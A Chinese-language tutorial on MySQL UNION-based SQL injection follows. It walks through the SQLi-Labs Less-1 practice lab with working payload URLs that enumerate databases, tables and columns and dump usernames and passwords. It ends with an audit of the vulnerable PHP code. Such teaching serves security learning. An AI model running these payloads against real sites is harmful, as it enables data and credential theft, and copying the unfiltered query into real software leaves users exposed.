联合注入

联合查询注入（union query SQL injection）是最常用的注入方式之一，同时也是最快速获取数据库中数据的注入方式。其原理是通过使用union联合两个或多个select语句并将联合查询之后的结果回显到页面中。理论上满足union注入条件时，可以将用户有权限访问的所有数据库信息查询出来。

注入原理

联合查询的语法规则如下所示，其直接结果是将两个select查询的结果放置在一张表中，其中第一个查询的结果在表中先显示，第二个查询的结果在表中后显示，操作结果如下图所示。

-- 语法规则
select ... union select ...

-- 示例代码
select id,username,password from users union select user(),database(),version();

​ 由上述操作可知，使用union注入需要以下必要条件：

  1. 查询结果回显到页面中（新闻显示，用户信息显示等功能模块）
  2. 两个查询的列数必须一致（由union查询语义决定）
  3. 第一个查询结果站主导位置，若只想显示第二个查询结果需要将第一个表查询结果置空
  4. 进一步的信息查询需要具备相应的查询权限，权限过低可能会影响查询的结果

注入步骤

  1. 第一步，先确定第一个查询的字段数量。

使用order/group by语句，通过往后边拼接数字，可确定字段数量，若大于，则页面错误/无内容，若小于或等于，则页面正常。若错误页与正常页一样，先测试是否关键字被过滤（union直接爆字段数等），否则更换测试报错注入/盲注。

  1. 第二步，判断结果在页面中的回显位置。

使用union select 1,2,3,4,x... 我们定义的数字将显示在页面上，即可从中判断页面显示的字段位置。

注意：

  • 若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面现在了单行数据输出，可以构造前边的select查询条件使其返回结果为空即可。
  • 注意一定要拼接足够的字段数，否则SQL语句报错。（此方法也可作为判断字段数的方法之一。)
  1. 第三步，在显示的字段位置使用union来查询数据。

首先，查询当前数据库名database()、数据库账号user()、数据库版本version()等基本情况，再根据不同的版本、不同的权限确定接下来的方法。

  • 若MySQL版本<5.0

    简单的说，由于mysql的低版本缺乏系统库information_schema，故通常情况下，我们无法直接查询表名，字段（列）名等信息，这时候只能靠猜来解决。直接猜表名与列名是什么，甚至是库名，再使用联合查询取数据。

  • 若MySQL版本>=5.0

    information_schema(库)
┝▬information_schema.schemata(表)
  ┝▬schema_name(存放数据库名)
┝▬information_schema.tables(表)
  ┝▬table_schema(存放数据库名)
  ┝▬table_name(存放表名)
┝▬information_schema.columns(表)
  ┝▬table_schema(存放数据库名)
  ┝▬table_name(存放表名)
  ┝▬column_name(存放列名)

    • 首先，取一个名为information_schema的数据库里的schemata数据表查询全部数据库名，SQL语句执行结果如下图所示。(若不需要跨数据库的话，可直接跳过此步骤，直接查询相应的数据库下的全部数据表名)。

      select id,username,password from users where id = -1 union select 1,2,group_concat(schema_name) from information_schema.schemata;
-- group_concat():将指定字段值拼接成字符串

      ![image-20210225112617993](K:/Security/安全漏洞/02 SQLi/SQL注入笔记(mysql)/image-20210225112617993.png)

    • 接着，在information_schema的一个名为tables的数据表中存着全部的数据表信息。其中，table_name 字段保存其名称，table_schema保存其对应的数据库名。

      -- 当前数据库所有表名
select id,username,password from users where id = -1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database();
-- 输出 
+----+----------+-------------------------------+
| id | username | password                      |
+----+----------+-------------------------------+
|  1 | 2        | emails,referers,uagents,users |
+----+----------+-------------------------------+

-- 指定数据库所有表名
select id,username,password from users where id = -1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='Security';
-- 输出
+----+----------+-------------------------------+
| id | username | password                      |
+----+----------+-------------------------------+
|  1 | 2        | emails,referers,uagents,users |
+----+----------+-------------------------------+

      上述payload可查看全部的数据表名，其中group_concat函数将多行数据转成一行数据。

    • 其次，通过其表名，查询该表的所有字段名（列名）。通过information_schema库下的columns表可查询对应的数据库/数据库表含有的字段名。

      -- 当前数据库中的users表
select id,username,password from users where id = -1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users';
#此处的表名为字符串型，也通过十六进制表示
-- 输出
+----+----------+----------------------+
| id | username | password             |
+----+----------+----------------------+
|  1 | 2        | id,username,password |
+----+----------+----------------------+

-- security数据库中的user表
select id,username,password from users where id = -1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users';
-- 输出
+----+----------+----------------------+
| id | username | password             |
+----+----------+----------------------+
|  1 | 2        | id,username,password |
+----+----------+----------------------+

    • 知道了想要的数据存放的数据库、数据表、字段名，直接联合查询即可。

      -- 查询security数据库的users表中指定字段值
select id,username,password from users where id = -1 union select 1,username,password from security.users limit 0,1;
-- 输出
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
+----+----------+----------+
 简单的说，**查库名→查表名→查字段名→查数据**

实战演示

演示环境

  • 服务器系统：Windows Server 2008 R2
  • 脚本：php-5.2.17nts
  • 中间件：Apache-2.4.29
  • 数据库：mysql-5.1.73(root)
  • 客户机：Windows 10
  • 靶机：SQLi-Labs
  • 客户端：Windows10 + Firefox + HackBar

演示步骤

  1. 按照页面提示信息在地址栏中访问http://10.10.10.148:86/Less-1/index.php?id=1，结果展示如下图所示。

  2. 使用单引号测试SQL语句类型。在浏览器地址栏中输入:10.10.10.148:86/Less-1/index.php?id=1'，访问结果如下图所示。

  3. 由上图中的报错信息可以推测出SQL语句大致为：select * from users where id='参数' limit 0，1;，参数为String型而且SQL语句中使用单引号(')界定该参数。因此，我们可以构造的恒真语句为：

    1' or '1'='1
1' or 1=1--+

-- SQL解析
select * from users where id='1' or '1'='1' limit 0，1;
select * from users where id='1' or 1=1-- ' limit 0，1;

    其中1' or '1'='1的操作结果如下图所示。

  4. 使用order by语句来获取SQL查询结果的列数。使用如下payload的执行结果如下图所示。

    ?id=1' order by 1--+
?id=1' order by 2--+
?id=1' order by 3--+
?id=1' order by 4--+

-- SQL解析
select * from users where id='1' order by 1-- ' limit 0，1;

  5. 由上述操作结果表明，该位置的SQL语句查询结果为3列。因此我们使用如下所示的payload来判断该注入点的回显位置，操作结果如下图所示。

    http://10.10.10.148:86/Less-1/index.php?id=-1' union select 1,2,3--+

-- SQL解析
select * from users where id='-1' union select 1,2,3-- ' limit 0，1;

    注：

    • 使用union进行联合查询时想要查询的数据回显，则需要第一个查询结果为空。

  6. 使用user()、database()、version()函数等获取当前数据库的信息，payload如下所示，操作结果如下图所示。

    -- 获取当前用户信息
http://10.10.10.148:86/Less-1/index.php?id=-1' union select 1,user(),3--+
-- 获取当前数据库名称
http://10.10.10.148:86/Less-1/index.php?id=-1' union select 1,database(),3--+
-- 获取当前数据库版本信息
http://10.10.10.148:86/Less-1/index.php?id=-1' union select 1,version(),3--+
-- 获取数据库的路径信息
http://10.10.10.148:86/Less-1/index.php?id=-1' union select 1,@@datadir,3--+
-- 获取当前系统的版本信息
http://10.10.10.148:86/Less-1/index.php?id=-1' union select 1,@@version_compile_os,3--+

-- SQL解析
select * from users where id='-1'union select 1,user(),3-- ' limit 0，1;

  7. 由上述操作得知MySQL的版本为：5.1.73，因此数据库中存在information_schema数据库，因此可以使用如下payload爆MySQL中所有数据库名称，操作结果如下图所示。

    http://10.10.10.148:86/Less-1/index.php?id=-1' union select 1,group_concat(schema_name),3 from information_schema.schemata--+

-- SQL解析
select * from users where id='-1' union select 1,group_concat(schema_name),3 from information_schema.schemata-- 
' limit 0，1;

  8. 在得到数据库名称后，可以继续爆数据库中的数据表，使用如下所示的payload可以爆出security数据库中所有的数据表名称，操作结果如下图所示。

    http://10.10.10.148:86/Less-1/index.php?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+

-- SQL解析
select * from users where id='-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'-- ' limit 0，1;

  9. 在得到数据表名称后，可以继续爆数据表中的字段信息，使用如下所示的payload可以爆出users表中所有的列名，操作结果如下图所示。

    http://10.10.10.148:86/Less-1/index.php?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+

-- SQL解析
select * from users where id='-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'-- ' limit 0，1;

  10. 在得到数据库名称、数据表名称、数据列名称后，可以继续爆数据表中的字段值，使用如下所示的payload可以爆出id=2的用户名和密码，操作结果如下图所示。

    http://10.10.10.148:86/Less-1/index.php?id=-1' union select 1,username,password from users where id=2--+

-- SQL解析
select * from users where id='-1' union select 1,username,password from users where id=2-- ' limit 0，1;

-- 使用limit逐条显示(通过控制limit参数值)
http://10.10.10.148:86/Less-1/index.php?id=-1' union select 1,username,password from users limit 0,1--+

代码审计

源码：（未经过滤）

// 直接拼接SQL语句
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

if($row)
{
    // 回显查询信息（联合注入）
      echo "<font size='5' color= '#99FF00'>";
      echo 'Your Login name:'. $row['username'];
      echo "<br>";
      echo 'Your Password:' .$row['password'];
      echo "</font>";
}
else 
{
    echo '<font color= "#FFFF00">';
    // 显示报错信息（报错注入）
    print_r(mysql_error());
    echo "</font>";  
}
  • 上述代码中未对数据参数进行过滤就直接拼接SQL语句，完成符号闭合即可注入。又因为存在查询结果回显和报错回显，所以存在联合注入和报错注入。
